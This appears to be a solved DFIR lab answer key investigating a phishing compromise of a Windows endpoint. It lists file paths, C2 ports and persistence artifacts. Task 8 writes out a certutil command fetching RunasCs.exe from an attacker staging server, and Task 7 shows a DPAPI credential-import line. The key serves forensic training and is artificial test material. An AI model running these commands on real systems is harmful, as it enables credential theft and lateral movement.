![alt text](image.png)
# This lab’s severity is easy
# Description:
In this lab, you act as a DFIR analyst investigating a potential compromise on a Windows endpoint used by a junior employee named Steven. The investigation begins after Steven downloads a suspicious document from an external source, triggering a phishing-based intrusion.
The attacker leverages a malicious Office document (Policy.docm) to establish initial access. This document executes a multi-stage attack chain, downloading a stager script that deploys a remote access payload on the system. The malware is then used to maintain persistence, communicate with a command-and-control (C2) server, and facilitate further exploitation.
As the investigation progresses, evidence reveals credential abuse through DPAPI extraction, lateral movement using a downloaded remote execution tool, and privilege escalation to gain full control of the machine. The attacker also establishes multiple persistence mechanisms, including executable masquerading and shortcut-based backdoors.
The goal of this analysis is to reconstruct the full attack chain by examining disk artifacts, identifying malicious files and commands, and uncovering key indicators of compromise (IOCs) such as file paths, commands, credentials, ports, and persistence techniques.

# Scenario:
Steven, a junior consultant at a mid-sized firm recently downloaded a document from an external source, leading to a potential security incident. An attacker may have gained unauthorized access to a Windows machine, leaving behind traces of their activities. Your task is to examine the available disk artifacts to identify any suspicious behavior and help secure the system.

## Task 1:
Q: What is the name of the malicious document used in phishing, which facilitated initial access for the attacker?

A: `Policy.docm`

## Task 2:
Q: What was the full link from which the malicious document was downloaded?

A: `https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download`

## Task 3:
Q: The document downloaded a script, which acted as a stager and downloaded another payload, providing the attacker with hands-on remote access. When was this script downloaded?

A: `2025-06-07 05:42:11`

## Task 4:
Q: What is the full path of the final payload which provided remote access to the attacker?

A: `C:\users\Steven\AppData\Roaming\OpenDLL.exe`

## Task 5:
Q: Which port was used for C2 communication by the payload?

A: `8899`

## Task 6:
Q: The threat actor utilized a file created and used by Steven even before the attack. This file allowed the attacker to authenticate as user "Samy", abusing DPAPI to grab credentials of another user on the same machine. What is the full path of this file?

A: `C:\Users\Samy\Documents\connection.xml`

## Task 7:
Q: What is the full command used to grab credentials from the "Samy" account?

A: `$cred = Import-CliXml -Path connection.xml`

## Task 8:
Q: The attacker downloaded a tool from their internal staging server to laterally move and gain remote access as "Samy" user account. What is the full command used to download the tool?

A: `"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe`

## Task 9:
Q: What is the password for the user account "Samy", used by the attacker to gain a remote shell?

A: `Winter2025!`

## Task 10:
Q: After gaining access as Samy, the attacker downloaded a script to check privileges for the account. What is the name of the script?

A: `psgetsys.ps1`

## Task 11:
Q: The attacker exploited a Windows process to gain an elevated remote shell. What is the PID of this process?

A: `632`

## Task 12:
Q: Which port was used for remote access with escalated privileges?

A: `9006`

## Task 13:
Q: The attacker enabled persistence mechanisms for a backdoor executable. What is the full path of the file?

A: `C:\Windows\system32\document.pdf.exe`

## Task 14:
Q: The attacker also abused Windows shortcuts and placed a rogue shortcut file pointing to the malicious backdoor. What is the shortcut file name?

A: `NetworkDiagnostics.lnk`

## Task 15:
Q: What is the full path of the script that created the shortcut persistence?

A: `C:\programdata\wscript.vbs`